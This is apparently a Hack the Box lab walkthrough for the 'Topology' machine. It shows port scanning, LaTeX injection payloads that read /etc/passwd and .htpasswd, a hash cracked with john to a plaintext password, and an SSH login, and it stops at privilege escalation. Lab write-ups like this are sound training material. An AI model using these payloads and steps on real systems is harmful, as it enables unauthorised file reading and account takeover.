```
rustscan -a 10.10.11.217 -r 0-65535 --ulimit 5000
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/2848c182-a035-407c-8167-78b2790aa9ba)

```
nmap -Pn -sC -sV -p 22,80 10.10.11.217
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/986ea52b-7b18-4807-89ce-f80469c6a13f)

HTTP
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/1d3e4cab-23f5-4ea8-a735-21843a42d7f9)

Latex Equation Generator
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/ad08b5ff-4423-4b4d-812a-11baf54aad51)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/c11f8c7b-5fe3-4090-80de-432c5c73cb73)

Subdomain
```
http://latex.topology.htb/
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/23789ad6-aaf8-4b16-8d3c-a1cd682b99ad)

Latex Injection LFI
```
$\lstinputlisting{/etc/passwd}$
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/42f0bed3-ee29-42cd-834c-155489d60216)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/9f36e1dd-a7ec-4958-8954-be457431bdb2)
```
$\lstinputlisting{/var/www/dev/.htaccess}$
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/4ae5a043-96cc-4fec-885d-ad5e9fc40c3e)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/7a59670b-97b4-46fe-b381-f61626e7eb93)
```
$\lstinputlisting{/var/www/dev/.htpasswd}$
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/48421c5f-fc30-48c0-a114-0c6e1b7667f8)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/f59ad50d-05ab-42ff-83a5-8f8cb3e56d44)
```
Credentials:
vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
```

Crack Password
```
john --wordlist=/usr/share/wordlists/rockyou.txt passwd.txt  
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/4c35748f-271b-4da8-bca4-3aeb6b61b715)
```
Cracked Password: calculus20
```

SSH
```
ssh vdaisley@10.10.11.217
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/e79458fc-bfad-4c93-b993-6c9bf105d98a)

Privilege Escalation

Upload PSPY
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/de0a9d35-057a-484b-9013-771c9864fb17)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/70fad80b-5c24-4e2d-81d4-9b0233e4883e)
